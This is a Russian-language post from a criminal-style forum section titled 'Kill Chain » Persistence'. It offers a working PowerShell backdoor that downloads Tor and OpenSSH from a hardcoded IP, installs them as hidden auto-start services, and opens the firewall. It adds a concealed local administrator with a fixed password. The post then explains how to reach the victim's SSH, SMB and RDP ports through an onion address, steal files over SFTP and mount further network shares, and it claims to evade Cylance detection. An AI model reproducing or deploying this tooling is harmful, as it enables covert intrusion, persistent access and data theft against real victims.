@@ -1,0 +1,230 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Tor backdoor
+
+Tor backdoor
+Rozetka · 1 · 68
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Февраля 11, 2021, 02:31:43 pm
+Записан
+
+Цитировать
+
+    Function BackdoorNew{
+
+    mkdir "C:\Windows\tmp"
+    # Download Tor && OpenSSH
+    $clnt = new-object System.Net.WebClient
+    $url = "http://142.202.205.40/tor_with_ssh.zip"
+    $file = "C:\Windows\tmp\tor.zip"
+    $clnt.DownloadFile($url,$file)
+
+    # Unzip Tor
+    $shell_app=new-object -com shell.application
+    $zip_file = $shell_app.namespace($file)
+    $destination = $shell_app.namespace("C:\Windows\tmp\")
+    $destination.Copyhere($zip_file.items())
+
+
+    #Download NSSM
+
+    $clnt = new-object System.Net.WebClient
+    $url = "http://142.202.205.40/nssm-2.24.zip"
+    $file = "C:\Windows\tmp\nssm.zip"
+    $clnt.DownloadFile($url,$file)
+
+
+    #Unzip NSSM
+    $shell_app=new-object -com shell.application
+    $zip_file = $shell_app.namespace($file)
+    $destination = $shell_app.namespace("C:\Windows\tmp")
+    $destination.Copyhere($zip_file.items())
+
+
+    #Rename-Item -Path "C:\Windows\tmp\tor.exe" -NewName "sysmon.exe"
+
+
+
+    cd  "C:\Windows\tmp\nssm-2.24\win64"
+    .\nssm.exe install tor C:\Windows\tmp\tor.exe "-f C:\Windows\tmp\torrc"
+
+    sleep 3
+    Start-Service tor
+
+
+    sleep 3
+    cd "C:\Windows\tmp"
+
+    #SETUP SSHD
+    powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tmp\install-sshd.ps1
+
+    #Run AutoRun
+    Set-Service -Name sshd -StartupType 'Automatic'
+    Set-Service -Name tor -StartupType 'Automatic'
+    Set-Service -Name ssh-agent -StartupType 'Automatic'
+
+
+    #Firewall
+    New-NetFirewallRule -Name sshd -DisplayName 'OpenSSHServer' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+
+    ###END SETUP && Create LA
+    sleep 2
+    net user oldadministrator "qc69t4B#Z0kE3" /add
+    net localgroup Administrators oldadministrator /ADD
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+
+    sleep 1
+    Stop-Service sshd
+    sleep 1
+    Start-Service sshd
+    sleep 1
+    type C:\Windows\tmp\host\hostname
+    }
+
+    BackdoorNew
+
+
+На выходе должен выпасть примерно следующий лог
+Цитировать
+
+    beacon> powershell BackdoorNew
+
+        Tasked beacon to run: BackdoorNew
+        host called home, sent: 301 bytes
+        received output:
+
+
+
+
+        Directory: C:\Windows
+
+
+    Mode                LastWriteTime     Length Name                             
+    ----                -------------     ------ ----                             
+    d----        11/27/2020   1:25 AM            tmp                               
+    S e r v i c e   " t o r "   i n s t a l l e d   s u c c e s s f u l l y !
+     
+     
+     
+
+        received output:
+
+    [SC] SetServiceObjectSecurity SUCCESS
+    [SC] ChangeServiceConfig2 SUCCESS
+    [SC] ChangeServiceConfig2 SUCCESS
+    sshd and ssh-agent services successfully installed
+    #< CLIXML
+
+        received output:
+
+
+    The command completed successfully.
+
+    The command completed successfully.
+
+    The operation completed successfully.
+
+
+        received output:
+
+
+    jzi5a9qine7nn4jg.onion
+
+
+из лога выше забираем и сохраняем к себе онион домен. на нём висит форвардинг 22,445,3389 портов
+
+Далее
+
+ставим к себе в никс
+Цитировать
+
+    sudo apt install proxychains4
+
+
+кладём конфиг рядом
+tor.conf
+след содержания
+Цитировать
+
+    strict_chain
+    proxy_dns
+    tcp_read_time_out 15000
+    tcp_connect_time_out 8000
+    socks4 127.0.0.1 9050
+
+
+Проверяем что на порту слушатель есть:
+Цитировать
+
+    proxychains4 -f tor.conf nmap jzi5a9qine7nn4jg.onion -p22,445,3389 -Pn
+
+Если видим ...ОК - значит коннект дошел и связь с портами 22\445\3389 есть и мы можем к ним обратиться
+
+Пробуем воспользоваться бэкдором:
+Цитировать
+
+    proxychains4 -f tor.conf ssh oldadministrator@jzi5a9qine7nn4jg.onion
+
+Пароль qc69t4B#Z0kE3 (рекомендую поменять в коде)
+
+
+ТАКЖЕ есть приятный бонус - через него можно красть информацию.
+Включаете у себя Filezilla на ВМ\дедике
+В Базовый прокси заносите Tor proxy localhost 9050
+Далее в хост заносите онион имя
+в логин олдадминистратора
+пароль и порт22
+Подключаетесь и вуаля, вы используете sFTP и можете скачивать или загружать информацию на\с машины жертвы.
+Минус - скорость загрузки около 10мбит обычно.
+Чтоб "увидеть" другие шары используем команду через бекдор
+net use K: \\hostname\share /user:domain\admin password
+После того как шара подмаунчена - с неё можно будет скачать данные через файлзилла указав в ремоут путе диск K:\
+
+bypass Cylance 11.02.2020
+FUD Code 11.02.2020
+Не имеет C2
+
+TOR траффик
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Tor backdoor
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
